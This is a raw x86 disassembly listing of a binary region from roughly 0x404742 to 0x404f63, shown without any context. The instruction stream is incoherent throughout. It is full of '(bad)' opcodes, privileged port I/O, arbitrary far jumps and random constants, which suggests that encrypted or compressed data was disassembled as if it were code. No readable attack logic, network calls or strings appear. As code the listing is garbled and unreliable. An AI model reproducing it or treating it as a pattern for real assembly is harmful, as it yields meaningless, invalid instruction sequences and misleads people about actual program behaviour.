  404742:	fbstp  TBYTE PTR [ebp-0x18]
  404745:	lea    edi,[ebx+0x3]
  404748:	mov    edx,0x8a9b3c09
  40474d:	jecxz  0x40470e
  40474f:	inc    ecx
  404750:	jecxz  0x404796
  404752:	sub    ah,bh
  404754:	dec    eax
  404755:	loope  0x40475b
  404757:	and    ah,0xf
  40475a:	add    ax,0x3030
  40475e:	sub    edi,eax
  404760:	fld    TBYTE PTR [ebp-0x3fb962be]
  404766:	stos   BYTE PTR es:[edi],al
  404767:	inc    esp
  404768:	clc    
  404769:	add    edi,DWORD PTR [ebp+0x8]
  40476c:	jns    0x404775
  40476e:	cld    
  40476f:	data16 cli 
  404771:	xlat   BYTE PTR ds:[ebx]
  404772:	dec    ebp
  404773:	jge    0x40478d
  404775:	cmp    edi,DWORD PTR [ebp+0xc]
  404778:	dec    esi
  404779:	add    al,0x83
  40477b:	call   DWORD PTR [edx]
  40477d:	jae    0x4047a6
  40477f:	jle    0x4047ec
  404781:	icebp  
  404782:	dec    ebx
  404783:	lea    edi,[ebx]
  404785:	add    esi,DWORD PTR ds:0x6fa2572
  40478b:	add    BYTE PTR [edi+0x78],cl
  40478e:	or     eax,0x897edbfe
  404793:	out    0x7,eax
  404795:	adc    cl,bh
  404797:	in     eax,dx
  404798:	jmp    0x4047b9
  40479a:	data16 (bad) 
  40479c:	mov    al,0x31
  40479e:	div    BYTE PTR fs:[edi]
  4047a1:	fdivr  st,st(3)
  4047a3:	jmp    0x4047b9
  4047a5:	mov    edi,0x2019249d
  4047aa:	xor    BYTE PTR [ecx+esi*8-0x5],dh
  4047ae:	jp     0x40481b
  4047b0:	mov    ebx,0x880856eb
  4047b5:	shr    dx,0x6d
  4047b9:	mov    DWORD PTR [ebx+edx*2],esi
  4047bc:	add    al,bl
  4047be:	xchg   DWORD PTR [ebx],eax
  4047c0:	ds call 0x652e3610
  4047c6:	pop    ds
  4047c7:	pop    gs
  4047c9:	les    esp,FWORD PTR [ebx-0x5ed8ef9e]
  4047cf:	rcr    DWORD PTR [edi+0x706d535a],0x9
  4047d6:	sar    edi,1
  4047d8:	mov    bh,0x83
  4047da:	rol    BYTE PTR [edi-0x482fa522],cl
  4047e0:	addr16 neg eax
  4047e3:	sbb    edx,0x3c
  4047e6:	test   BYTE PTR [eax],cl
  4047e8:	or     edi,edi
  4047ea:	jge    0x4047e4
  4047ec:	out    0x88,al
  4047ee:	scas   al,BYTE PTR es:[edi]
  4047ef:	mov    al,BYTE PTR [esp+edi*2]
  4047f2:	pop    ds
  4047f3:	mov    edi,0xe12d4129
  4047f8:	mov    ebp,?
  4047fa:	fistp  QWORD PTR [esi]
  4047fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047fd:	sbb    edx,0xde0b6b3
  404803:	jae    0x4047f7
  404805:	dec    ecx
  404806:	add    eax,0x123d20d
  40480b:	ficomp DWORD PTR [esi+0x60]
  40480e:	loopne 0x404877
  404810:	in     al,0xdf
  404812:	ins    DWORD PTR es:[edi],dx
  404813:	add    eax,0xdf0a82fa
  404818:	rcl    cl,1
  40481a:	or     bl,BYTE PTR gs:[esi]
  40481d:	fidiv  DWORD PTR [edi+eax*4-0x3cf58d01]
  404824:	push   es
  404825:	lea    edx,[ebx]
  404827:	pop    es
  404828:	ficom  WORD PTR [ebp-0x47]
  40482c:	or     al,0xfd
  40482e:	(bad)  
  40482f:	xchg   ebx,eax
  404830:	test   DWORD PTR [ebx],ecx
  404832:	sub    DWORD PTR [ebp+0x1e],esi
  404835:	into   
  404836:	and    al,0xf
  404838:	jne    0x404859
  40483a:	dec    ecx
  40483b:	mov    bh,0xb0
  40483d:	(bad)  
  40483e:	outs   dx,DWORD PTR ds:[esi]
  40483f:	adc    al,0xeb
  404841:	cmp    DWORD PTR [eax+0x1fbe04c8],ecx
  404847:	adc    ch,dh
  404849:	lods   eax,DWORD PTR ds:[esi]
  40484a:	int    0x3d
  40484c:	and    BYTE PTR [esi],al
  40484e:	and    edx,ebp
  404850:	add    BYTE PTR [ebp+0x3703134c],cl
  404856:	mov    bh,0xdd
  404858:	cs push edi
  40485a:	mov    BYTE PTR [edi],0xe7
  40485d:	cmp    BYTE PTR [edi],0xe3
  404860:	idiv   DWORD PTR [ebx+0xaeb1fde]
  404866:	push   esi
  404867:	fmul   DWORD PTR [edx+edi*1]
  40486a:	fisttp DWORD PTR [eax+0x6752e70d]
  404870:	cmc    
  404871:	loope  0x404895
  404873:	sub    al,0x8
  404875:	pop    ds
  404876:	hlt    
  404877:	pop    ebp
  404878:	sbb    BYTE PTR [edx],al
  40487a:	ror    DWORD PTR [eax],0x2b
  40487d:	pop    es
  40487e:	ins    BYTE PTR es:[edi],dx
  40487f:	clc    
  404880:	or     esi,DWORD PTR [edi+0x78d99b17]
  404886:	fclex  
  404889:	fldcw  WORD PTR ds:0xeed9ab4c
  40488f:	inc    edx
  404890:	lods   eax,DWORD PTR ds:[esi]
  404891:	icebp  
  404892:	aaa    
  404893:	shl    DWORD PTR [ebx+eiz*4-0x76],cl
  404897:	ds cmp bh,0x2b
  40489b:	(bad)  
  40489c:	add    al,0x7c
  40489e:	pop    ebp
  40489f:	ror    BYTE PTR [edi-0x2fb9fe18],1
  4048a5:	fs scas al,BYTE PTR es:[edi]
  4048a7:	ss cmp bl,dl
  4048aa:	pop    ss
  4048ab:	bound  ebp,QWORD PTR [edi+0x30]
  4048ae:	jne    0x4048b8
  4048b0:	inc    esi
  4048b1:	push   cs
  4048b2:	push   ds
  4048b3:	cmp    ecx,esi
  4048b5:	je     0x404906
  4048b7:	adc    bh,ch
  4048b9:	mov    ebx,0x3c1685d0
  4048be:	inc    ebp
  4048bf:	mov    eax,ds:0xca145246
  4048c4:	pop    eax
  4048c5:	add    edx,eax
  4048c7:	mov    ecx,0x3f8aed4a
  4048cc:	dec    esp
  4048cd:	jne    0x404902
  4048cf:	mov    ds:0x85196cf,eax
  4048d4:	push   0x4b2bf082
  4048d9:	mov    esp,0x251fed1
  4048de:	fchs   
  4048e0:	sbb    BYTE PTR [eax-0x63c020fc],cl
  4048e6:	fistp  DWORD PTR [edx+ebp*4-0x23]
  4048ea:	cmp    BYTE PTR [edi],0xa
  4048ed:	test   ax,0x7aeb
  4048f1:	mov    al,0x1
  4048f3:	outs   dx,BYTE PTR ds:[esi]
  4048f4:	pop    edi
  4048f5:	xor    edx,DWORD PTR [ecx]
  4048f7:	and    al,dl
  4048f9:	mov    ebp,DWORD PTR [ebp-0x6f]
  4048fc:	jmp    0x404954
  4048fe:	jmp    FWORD PTR [ebx-0x4b]
  404901:	mov    edi,0x203c0466
  404906:	faddp  st(2),st
  404908:	fsubr  DWORD PTR [esp+ebp*1+0x730a043a]
  40490f:	not    dh
  404911:	shl    bl,0xf
  404914:	fimul  DWORD PTR ds:0x2dab153
  40491a:	inc    edx
  40491b:	jmp    0x404907
  40491d:	sbb    edx,esi
  40491f:	into   
  404920:	xlat   BYTE PTR ds:[ebx]
  404921:	js     0x4048ad
  404923:	push   cs
  404924:	sti    
  404925:	scas   eax,DWORD PTR es:[edi]
  404926:	stc    
  404927:	xchg   ebx,eax
  404928:	sub    DWORD PTR [esi+0xe3f6f5d],edi
  40492e:	inc    esi
  40492f:	imul   edx,edx,0xa
  404932:	pop    DWORD PTR [ecx+0x72c8f4fa]
  404938:	jmp    0xd082:0x8cc0021b
  40493f:	mov    ah,0x15
  404941:	mul    DWORD PTR [eax]
  404943:	mov    dh,0x8
  404945:	inc    ebx
  404946:	pop    ecx
  404947:	xor    DWORD PTR [edi],ecx
  404949:	pushf  
  40494a:	pop    edx
  40494b:	mov    al,ds:0xb681d9d5
  404950:	ror    BYTE PTR [edx+0x7],0xa7
  404954:	mov    dh,0x4d
  404956:	ret    0xc88b
  404959:	push   cs
  40495a:	shl    BYTE PTR [ecx],0x8b
  40495d:	inc    ebx
  40495e:	es pop ebx
  404960:	push   edx
  404961:	pop    ebx
  404962:	outs   dx,DWORD PTR ds:[esi]
  404963:	das    
  404964:	add    BYTE PTR [edx+0x14],dl
  404967:	push   ss
  404968:	enter  0x1b1,0x72
  40496c:	pop    ds
  40496d:	mov    cl,0x52
  40496f:	xor    esp,DWORD PTR [eax+0x58]
  404972:	ret    
  404973:	pop    ecx
  404974:	pusha  
  404975:	xchg   BYTE PTR [eax-0x3c],ah
  404978:	arpl   sp,bp
  40497a:	fwait
  40497b:	mov    ds,WORD PTR [esi]
  40497d:	std    
  40497e:	or     BYTE PTR es:[edx-0x2c],dh
  404982:	scas   eax,DWORD PTR es:[edi]
  404983:	fld    TBYTE PTR [esp]
  404986:	fstp   QWORD PTR [esi]
  404988:	fwait
  404989:	adc    dh,BYTE PTR [edx+0x1]
  40498c:	mov    dh,0x20
  40498e:	or     al,0x2b
  404990:	fxam   
  404992:	add    dh,BYTE PTR [edx-0x3e]
  404995:	jae    0x404948
  404997:	add    DWORD PTR [edi+0x568d835b],edi
  40499d:	ds loope 0x40497d
  4049a0:	mov    al,ds:0xf8e95021
  4049a5:	ret    0x410d
  4049a8:	sub    esp,0x8
  4049ab:	mov    ecx,0x5a589b24
  4049b0:	jmp    0x4049c3
  4049b2:	push   esi
  4049b3:	mov    ds:0xb3f707b9,al
  4049b8:	push   esp
  4049b9:	sbb    DWORD PTR [edx],ecx
  4049bb:	pusha  
  4049bc:	or     DWORD PTR [ecx],eax
  4049be:	adc    eax,0x5a057e2a
  4049c3:	xchg   ebp,eax
  4049c4:	or     bh,BYTE PTR [ebx+0x2c64d741]
  4049ca:	sub    bl,BYTE PTR [ebx+0x47]
  4049cd:	clc    
  4049ce:	repz or al,0x7c
  4049d1:	jnp    0x4049fe
  4049d3:	jo     0x404a47
  4049d5:	retf   
  4049d6:	sbb    BYTE PTR [ebx+0x4d],dh
  4049d9:	add    eax,0x47733cfa
  4049de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049df:	push   edx
  4049e0:	shl    BYTE PTR [edx+0x4f1e41f9],0xdf
  4049e7:	mov    esi,0x3a73c1b5
  4049ec:	hlt    
  4049ed:	shl    BYTE PTR [ebx],0x80
  4049f0:	out    dx,al
  4049f1:	add    BYTE PTR ss:[eax],cl
  4049f4:	shr    BYTE PTR [ecx-0x2e],cl
  4049f7:	pusha  
  4049f8:	jb     0x4049d3
  4049fa:	mov    dh,0xa0
  4049fc:	jmp    0x3e8:0xd10ac287
  404a03:	outs   dx,DWORD PTR ds:[esi]
  404a04:	pop    ebp
  404a05:	or     eax,0xdb4a6968
  404a0a:	add    bl,al
  404a0c:	xor    eax,0x9bc170a4
  404a11:	mov    BYTE PTR [esi+0x63],dh
  404a14:	or     ch,bl
  404a16:	sbb    BYTE PTR [ebx-0x3a144759],bl
  404a1c:	sub    eax,0xd5595e9f
  404a21:	mov    ecx,ebx
  404a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a24:	dec    esp
  404a25:	push   cs
  404a26:	sbb    BYTE PTR [edx],al
  404a28:	int    0xb7
  404a2a:	pop    ebp
  404a2b:	ret    0x1a0
  404a2e:	and    eax,0x1075ffea
  404a33:	add    eax,0xa6fb40d4
  404a38:	mov    edx,0x8db2f0ad
  404a3d:	dec    ebp
  404a3e:	(bad)  
  404a3f:	mov    dx,0xb263
  404a43:	xor    esi,DWORD PTR [ecx-0x66cffdcb]
  404a49:	retf   
  404a4a:	jo     0x404a5b
  404a4c:	cmp    al,0x0
  404a4e:	jb     0x404a39
  404a50:	(bad)  
  404a51:	and    bh,BYTE PTR [ebx-0x31]
  404a54:	adc    bh,ah
  404a56:	call   0xc1c8015e
  404a5b:	and    bl,BYTE PTR [edx+0xc]
  404a5e:	sub    ecx,eax
  404a60:	sbb    ecx,eax
  404a62:	xor    DWORD PTR [ebp-0x1f3bd250],0x3
  404a69:	xchg   esp,eax
  404a6a:	and    DWORD PTR [ecx],ecx
  404a6c:	fnstenv [esi]
  404a6e:	mov    esi,0xf16fdbc8
  404a73:	adc    BYTE PTR [ebx],dh
  404a75:	dec    esi
  404a76:	test   BYTE PTR [ebp+0xe1475d2],0xb9
  404a7d:	nop
  404a7e:	add    DWORD PTR [eax-0xe2ba3fe],esi
  404a84:	mov    eax,0x58207067
  404a89:	ss xchg edi,eax
  404a8b:	push   0xffffffb7
  404a8d:	outs   dx,DWORD PTR ds:[esi]
  404a8e:	inc    edi
  404a8f:	call   0xa74da0
  404a94:	dec    esi
  404a95:	jg     0x404a24
  404a97:	add    al,0x40
  404a99:	add    al,ch
  404a9b:	aam    0xee
  404a9d:	pop    ss
  404a9e:	bound  edx,QWORD PTR [ecx]
  404aa0:	pop    ds
  404aa1:	pop    ss
  404aa2:	inc    BYTE PTR [ecx]
  404aa4:	jb     0xe24fa238
  404aaa:	sub    eax,0xf251b0c
  404aaf:	xchg   DWORD PTR [ebx-0x112692fc],eax
  404ab5:	outs   dx,BYTE PTR ds:[esi]
  404ab6:	jmp    0xc45c82d
  404abb:	ja     0x404b34
  404abd:	or     edi,ebx
  404abf:	jno    0x404b3f
  404ac1:	aam    0xfd
  404ac3:	es add bh,0x20
  404ac7:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  404acb:	ja     0x404b31
  404acd:	or     al,0x48
  404acf:	dec    DWORD PTR [ebx+0x112856c4]
  404ad5:	jg     0x404aed
  404ad7:	add    ebx,DWORD PTR [edx+ecx*2-0x2]
  404adb:	inc    ecx
  404adc:	dec    eax
  404add:	(bad)  
  404ade:	fdiv   DWORD PTR [edi-0x31e797fa]
  404ae4:	dec    ecx
  404ae5:	mov    eax,ecx
  404ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ae8:	cdq    
  404ae9:	idiv   esi
  404aeb:	imul   esi,ecx,0xe8aa496d
  404af1:	sub    BYTE PTR [esi-0x2249492f],ch
  404af7:	mov    ebp,0x2bf203f6
  404afc:	lock pop ds
  404afe:	mov    dh,0x1f
  404b00:	stc    
  404b01:	add    esi,eax
  404b03:	das    
  404b04:	ret    
  404b05:	add    al,0x84
  404b07:	test   DWORD PTR [esi],edx
  404b09:	loope  0x404a8c
  404b0b:	out    dx,al
  404b0c:	ret    
  404b0d:	cmp    eax,0x2c68f46e
  404b12:	sub    BYTE PTR [ecx],cl
  404b14:	and    eax,0x4ab4b364
  404b19:	push   ss
  404b1a:	xchg   esp,eax
  404b1b:	mov    dl,0xde
  404b1d:	pop    edx
  404b1e:	jmp    0xe84d:0xe46821c9
  404b25:	popa   
  404b26:	jg     0x404b8f
  404b28:	out    dx,al
  404b29:	xor    eax,0xc7499f34
  404b2e:	xchg   ebp,eax
  404b2f:	fld    DWORD PTR [edi]
  404b31:	hlt    
  404b32:	ss jo  0x404b0d
  404b35:	and    al,BYTE PTR [ebx+eax*1]
  404b38:	sub    dh,BYTE PTR [edi+0x25d05169]
  404b3e:	cmp    ch,cl
  404b40:	mov    eax,ds:0x491f4207
  404b45:	data16 loope 0x404bc5
  404b48:	mov    eax,ds:0xf9817a2f
  404b4d:	mov    cl,0x3a
  404b4f:	xor    eax,0xe981137c
  404b54:	pop    es
  404b55:	or     DWORD PTR [esi-0x3c92984a],eax
  404b5b:	mov    ds:0x60ed7d12,al
  404b60:	repnz das 
  404b62:	add    eax,0xf085e118
  404b67:	lahf   
  404b68:	lods   al,BYTE PTR ds:[esi]
  404b69:	mov    ss,WORD PTR [ecx-0x44389960]
  404b6f:	mov    ch,0xed
  404b71:	lods   eax,DWORD PTR ds:[esi]
  404b72:	add    al,0x4f
  404b74:	dec    WORD PTR [ebp+0x14]
  404b78:	sbb    DWORD PTR [esi+edx*1],0x1a1e6b66
  404b7f:	pop    edx
  404b80:	ins    BYTE PTR es:[edi],dx
  404b81:	popa   
  404b82:	fs add ebx,eax
  404b85:	sub    DWORD PTR [ecx*8-0x67d2130e],edx
  404b8c:	pop    ebp
  404b8d:	mov    ch,0x5
  404b8f:	sub    al,0x9e
  404b91:	shl    eax,0x2
  404b94:	sbb    eax,0x8c2b00da
  404b99:	sbb    BYTE PTR [edx+0x15],cl
  404b9c:	and    BYTE PTR [edx-0x75],al
  404b9f:	fsub   DWORD PTR [edi]
  404ba1:	pop    ebp
  404ba2:	jb     0x404b4c
  404ba4:	add    DWORD PTR [esi],ebx
  404ba6:	or     BYTE PTR [ebx-0x543d754e],bh
  404bac:	in     al,dx
  404bad:	data16 fdiv QWORD PTR [ebp+0x3f5b5737]
  404bb4:	enter  0x5690,0x4c
  404bb8:	dec    esi
  404bb9:	(bad)  
  404bba:	mov    esp,0xcd6dbb9b
  404bbf:	test   DWORD PTR ss:[esi+0x3b],0x90b7207
  404bc7:	or     eax,0x47368229
  404bcc:	das    
  404bcd:	inc    eax
  404bce:	jmp    0x404bac
  404bd0:	int    0x1b
  404bd2:	sbb    DWORD PTR [esi-0x372ba32a],esi
  404bd8:	add    DWORD PTR [eax-0x270bf5ee],eax
  404bde:	sbb    BYTE PTR [eax+0x5ec28b6e],dh
  404be4:	sub    edx,DWORD PTR [ecx+0x5e]
  404be7:	lock inc esi
  404be9:	mov    ds:0x23f66ae,al
  404bee:	es (bad) 
  404bf0:	push   ds
  404bf1:	push   0x946228c1
  404bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf7:	fiadd  DWORD PTR [ebx+0x61c60e13]
  404bfd:	push   ds
  404bfe:	clc    
  404bff:	retf   0xb9fc
  404c02:	aaa    
  404c03:	mov    cl,0x14
  404c05:	xchg   ebx,eax
  404c06:	mov    dh,0xf9
  404c08:	dec    ecx
  404c09:	inc    eax
  404c0a:	add    al,0xa0
  404c0c:	push   esp
  404c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0e:	daa    
  404c0f:	mov    cl,BYTE PTR ds:0x64667caf
  404c15:	adc    bh,al
  404c17:	push   esp
  404c18:	xchg   esp,eax
  404c19:	xor    dh,BYTE PTR [ecx*2-0x5455f23a]
  404c20:	fsub   DWORD PTR [edx-0x2cc50367]
  404c26:	push   eax
  404c27:	scas   eax,DWORD PTR es:[edi]
  404c28:	and    esp,DWORD PTR [eax+0x1a42daab]
  404c2e:	in     al,dx
  404c2f:	xchg   edx,eax
  404c30:	adc    dl,BYTE PTR [ecx-0x37]
  404c33:	adc    DWORD PTR [edi+0x20],esi
  404c36:	lea    edx,[ecx+edx*1-0x5aafee95]
  404c3d:	test   DWORD PTR [ecx],0x98010856
  404c43:	sbb    edi,eax
  404c45:	and    cl,dl
  404c47:	sub    esp,DWORD PTR [esi-0xd]
  404c4a:	sub    DWORD PTR [edi-0x7d7b04f4],ebp
  404c50:	sub    eax,0x1f59b869
  404c55:	ss jle 0x404c0b
  404c58:	pop    esp
  404c59:	pop    ebx
  404c5a:	dec    ebp
  404c5b:	and    eax,0xe03f046a
  404c60:	int    0xd4
  404c62:	scas   al,BYTE PTR es:[edi]
  404c63:	ss ss in al,0x80
  404c67:	call   0x6af36432
  404c6c:	jo     0x404ccb
  404c6e:	mov    ds:0x58b9d9e0,al
  404c73:	and    DWORD PTR [ebx-0x2b28cc46],edi
  404c79:	add    al,0x67
  404c7b:	fcmovbe st,st(0)
  404c7d:	push   cs
  404c7e:	inc    edi
  404c7f:	push   es
  404c80:	outs   dx,BYTE PTR ds:[esi]
  404c81:	mov    al,0x8
  404c83:	or     ebp,DWORD PTR [edi-0x56fbbcaf]
  404c89:	sub    BYTE PTR [ebx-0x7fefab73],0xf1
  404c90:	sub    ebp,ebp
  404c92:	mov    ds:0x8a10bbbd,al
  404c97:	adc    ah,BYTE PTR [ecx+0x74fb513a]
  404c9d:	pusha  
  404c9e:	dec    esp
  404c9f:	cld    
  404ca0:	inc    eax
  404ca1:	mov    eax,0xb8dc560b
  404ca6:	mov    DWORD PTR [edx-0xc],eax
  404ca9:	xchg   edi,eax
  404caa:	cmp    BYTE PTR cs:[eax-0x13],0xed
  404caf:	(bad)  
  404cb0:	sub    esi,DWORD PTR [esi]
  404cb2:	adc    DWORD PTR [edx],ebp
  404cb4:	retf   
  404cb5:	mov    DWORD PTR [eax+0xc],esi
  404cb8:	add    al,dh
  404cba:	jle    0x404cf3
  404cbc:	adc    eax,edx
  404cbe:	ror    BYTE PTR [eax-0x12],cl
  404cc1:	add    eax,0xf24ff050
  404cc6:	cmp    DWORD PTR [ebp+edi*4+0xa5c68fb],ebp
  404ccd:	mov    BYTE PTR [eax-0x13],0x1
  404cd1:	cmp    DWORD PTR [edi],esi
  404cd3:	jecxz  0x404cee
  404cd5:	mov    ebx,0x2b316485
  404cda:	in     al,0x50
  404cdc:	ds out 0x3a,al
  404cdf:	mov    dl,0x19
  404ce1:	sbb    eax,ebp
  404ce3:	jmp    0x30a2:0x1e3a466
  404cea:	pop    es
  404ceb:	or     ebx,edi
  404ced:	in     al,0xfe
  404cef:	dec    esi
  404cf0:	aam    0xc6
  404cf2:	fist   DWORD PTR [ecx*4-0x3103fff7]
  404cf9:	and    DWORD PTR [esi+0x65282adc],eax
  404cff:	jl     0x404d39
  404d01:	lods   al,BYTE PTR ds:[esi]
  404d02:	push   ecx
  404d03:	fiadd  WORD PTR ss:[ebx+0x1c]
  404d07:	inc    eax
  404d08:	aaa    
  404d09:	or     ch,BYTE PTR [esi-0xfe65b1a]
  404d0f:	jmp    0xfc3:0x20aceeee
  404d16:	fdivr  QWORD PTR [edx-0x7febca84]
  404d1c:	push   0x462b14ad
  404d21:	ss mov dh,0xe8
  404d24:	cld    
  404d25:	mov    ss,WORD PTR [edi+ecx*1]
  404d28:	add    eax,0xdf59b207
  404d2d:	mov    ah,0xb
  404d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d30:	das    
  404d31:	jmp    0x9537:0x55a5f695
  404d38:	mul    DWORD PTR [edi-0x46d5821e]
  404d3e:	xor    eax,0x850f4e59
  404d43:	mov    WORD PTR [eax],ds
  404d45:	mov    esp,0xa178a06d
  404d4a:	cmp    al,0x7
  404d4c:	inc    ecx
  404d4d:	(bad)  
  404d4e:	je     0x404d72
  404d50:	add    al,0xd
  404d52:	jne    0x404dd1
  404d54:	popf   
  404d55:	inc    ebp
  404d56:	adc    eax,0xe51c32a
  404d5b:	xchg   ecx,eax
  404d5c:	imul   DWORD PTR [ebp-0x37cb49a8]
  404d62:	or     eax,0x3d83602a
  404d67:	inc    eax
  404d68:	sub    al,0x6f
  404d6a:	or     BYTE PTR [ebp+0x9],ch
  404d6d:	jle    0x404dc6
  404d6f:	push   ss
  404d70:	loop   0x404d7a
  404d72:	dec    edi
  404d73:	mov    edx,0x888fc51b
  404d78:	xor    DWORD PTR [ebp+0x42],0x9c90032b
  404d7f:	imul   ebp,DWORD PTR [esi-0x6d9399fb],0x48
  404d86:	scas   eax,DWORD PTR es:[edi]
  404d87:	mov    ds:0xabec4f8,eax
  404d8c:	xlat   BYTE PTR ds:[ebx]
  404d8d:	je     0x404da4
  404d8f:	mov    ecx,DWORD PTR ds:0x13b0ece0
  404d95:	or     BYTE PTR [ebx-0x3d],ah
  404d98:	sbb    ebp,DWORD PTR [ecx+eiz*2]
  404d9b:	out    0x26,al
  404d9d:	mov    eax,ds:0x36e46cfb
  404da2:	sbb    BYTE PTR [eax],bl
  404da4:	nop
  404da5:	or     dl,BYTE PTR [edi]
  404da7:	mul    edx
  404da9:	in     eax,0xd0
  404dab:	dec    esi
  404dac:	push   esi
  404dad:	int3   
  404dae:	or     bh,dh
  404db0:	addr16 addr16 add esi,edx
  404db4:	adc    al,BYTE PTR [esi+0x65ec6b8c]
  404dba:	pop    esi
  404dbb:	jge    0x404e19
  404dbd:	jb     0x404d88
  404dbf:	adc    al,0xec
  404dc1:	out    dx,al
  404dc2:	repnz sbb al,0xe4
  404dc5:	ret    
  404dc6:	or     ebx,DWORD PTR [esi+0x2]
  404dc9:	jg     0x404dda
  404dcb:	push   0x74
  404dcd:	jge    0x404dba
  404dcf:	or     eax,0x3e42e486
  404dd4:	jns    0x404d56
  404dd6:	jge    0x404dc4
  404dd8:	in     al,dx
  404dd9:	push   ss
  404dda:	repnz lock dec eax
  404ddd:	je     0x404e12
  404ddf:	jne    0x404dcd
  404de1:	inc    ebx
  404de2:	clc    
  404de3:	or     eax,DWORD PTR [ebp+0x38802794]
  404de9:	xor    BYTE PTR [ebp+0x17],dh
  404dec:	push   ebx
  404ded:	inc    esp
  404dee:	mov    ds:0xc8c34860,eax
  404df3:	dec    ecx
  404df4:	gs add bh,bh
  404df7:	dec    ebp
  404df8:	xchg   ah,cl
  404dfa:	and    eax,0xbdf0f86e
  404dff:	enter  0x93d8,0xf7
  404e03:	jns    0x404e7e
  404e05:	add    BYTE PTR [ebx],cl
  404e07:	add    al,0xd
  404e09:	push   es
  404e0a:	test   al,0x9c
  404e0c:	add    edi,esi
  404e0e:	aam    0x6d
  404e10:	push   gs
  404e12:	mov    DWORD PTR [esi-0x7427fd2c],esi
  404e18:	jne    0x404db3
  404e1a:	mov    ecx,0x2ec82a61
  404e1f:	test   DWORD PTR [edi+0x6d075d16],ebx
  404e25:	pop    ebp
  404e26:	rol    DWORD PTR [edi-0x4a],1
  404e29:	mov    eax,0x4df1023e
  404e2e:	jb     0x404deb
  404e30:	je     0x404dd0
  404e32:	ud0    eax,DWORD PTR [eax+0x320e292]
  404e39:	in     eax,dx
  404e3a:	add    BYTE PTR [ebp-0x1c32ac18],ah
  404e40:	loope  0x404dfe
  404e42:	je     0x404e3f
  404e44:	les    edx,FWORD PTR [edi+0x51]
  404e47:	add    BYTE PTR [ebx-0x22],0x11
  404e4b:	js     0x404e93
  404e4d:	sub    ah,BYTE PTR [ebp-0x6]
  404e50:	bt     DWORD PTR ds:0xf549ae04,eax
  404e57:	push   es
  404e58:	jbe    0x404ed4
  404e5a:	gs mov ebx,ebp
  404e5d:	xchg   ecx,eax
  404e5e:	or     BYTE PTR [ebp-0x132787f0],ch
  404e64:	jge    0x404de6
  404e66:	mov    DWORD PTR [esi],eax
  404e68:	dec    edx
  404e69:	adc    DWORD PTR ds:[edx-0x77798a3],ecx
  404e70:	and    eax,0x2c9f04ea
  404e75:	sbb    dh,BYTE PTR [ebx-0x4a]
  404e78:	or     al,BYTE PTR [edx+0x6b]
  404e7b:	add    ecx,DWORD PTR [edi+edi*4-0x5d]
  404e7f:	dec    ebp
  404e80:	mov    edx,0x37c4564
  404e85:	loop   0x404e69
  404e87:	dec    eax
  404e88:	arpl   WORD PTR [esi-0x78],cx
  404e8b:	pop    ebp
  404e8c:	loop   0x404e43
  404e8e:	push   es
  404e8f:	sbb    esp,DWORD PTR [ebx+0x1d]
  404e92:	ficomp WORD PTR [ebx+0x38]
  404e95:	loop   0x404ed1
  404e97:	rcr    ch,1
  404e99:	aam    0x1d
  404e9b:	mov    bh,0x80
  404e9d:	outs   dx,DWORD PTR ds:[esi]
  404e9e:	jle    0x404e98
  404ea0:	and    al,0x85
  404ea2:	test   al,0x6
  404ea4:	wbinvd 
  404ea6:	les    ecx,FWORD PTR [ecx+0x3]
  404ea9:	fisttp DWORD PTR [edi]
  404eab:	or     eax,0x3fe7bdc1
  404eb0:	xor    cl,BYTE PTR [esi]
  404eb2:	or     eax,DWORD PTR [eax]
  404eb4:	or     al,0x5
  404eb6:	add    eax,DWORD PTR [eax]
  404eb8:	add    al,BYTE PTR [esi]
  404eba:	pop    es
  404ebb:	add    eax,0x4a227e19
  404ec0:	outs   dx,BYTE PTR ds:[esi]
  404ec1:	adc    ecx,DWORD PTR [edx]
  404ec3:	in     eax,dx
  404ec4:	test   ch,al
  404ec6:	ins    BYTE PTR es:[edi],dx
  404ec7:	call   0x37f:0x3740db66
  404ece:	fs xchg ecx,eax
  404ed0:	mul    BYTE PTR [ebx+0x66cb3480]
  404ed6:	mov    ecx,0x18e781b6
  404edb:	or     BYTE PTR [ebp+0x7e],0x35
  404edf:	pop    ebp
  404ee0:	out    0xda,eax
  404ee2:	test   DWORD PTR [ebx+0x37b336f],0xa0d1559a
  404eec:	mov    ds,ebp
  404eee:	ret    
  404eef:	push   0x68
  404ef1:	pop    ecx
  404ef2:	push   es
  404ef3:	cwde   
  404ef4:	pop    ecx
  404ef5:	cs inc ecx
  404ef7:	loop   0x404e7c
  404ef9:	mov    bh,0x2c
  404efb:	and    edi,edi
  404efd:	and    eax,0x1f66ecb9
  404f02:	inc    edx
  404f03:	xor    ecx,0x1c6ad06d
  404f09:	pop    ecx
  404f0a:	sti    
  404f0b:	or     ebx,DWORD PTR [ebx-0x28]
  404f0e:	shl    DWORD PTR [edx],0xba
  404f11:	add    al,0x17
  404f13:	dec    esi
  404f14:	in     al,dx
  404f15:	dec    esp
  404f16:	adc    al,0x7e
  404f18:	and    eax,0x3b38d55
  404f1d:	adc    BYTE PTR [ebx+0x10],ch
  404f20:	xchg   ebx,eax
  404f21:	and    DWORD PTR [edi+edx*8-0x28],0xd4fc692c
  404f29:	or     BYTE PTR [esi],cl
  404f2b:	and    al,0xcd
  404f2d:	ins    BYTE PTR es:[edi],dx
  404f2e:	jl     0x404f04
  404f30:	hlt    
  404f31:	dec    eax
  404f32:	sub    ah,BYTE PTR [esi+0x2f]
  404f35:	mov    ecx,0xeb18e788
  404f3a:	xor    BYTE PTR [ecx+ebp*4-0x7f426a49],cl
  404f41:	mov    ds:0x9c850415,al
  404f46:	(bad)  
  404f47:	fnstcw WORD PTR [ecx]
  404f49:	mov    dl,0x99
  404f4b:	dec    edx
  404f4c:	sbb    esp,ecx
  404f4e:	fs mov ebp,0x5d4b0d54
  404f54:	std    
  404f55:	dec    eax
  404f56:	je     0x404fa1
  404f58:	sub    edi,ecx
  404f5a:	xchg   esi,eax
  404f5b:	mov    ebp,0x7feb6d02
  404f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f61:	push   0xffffffee
  404f63:	or     al,0x7d
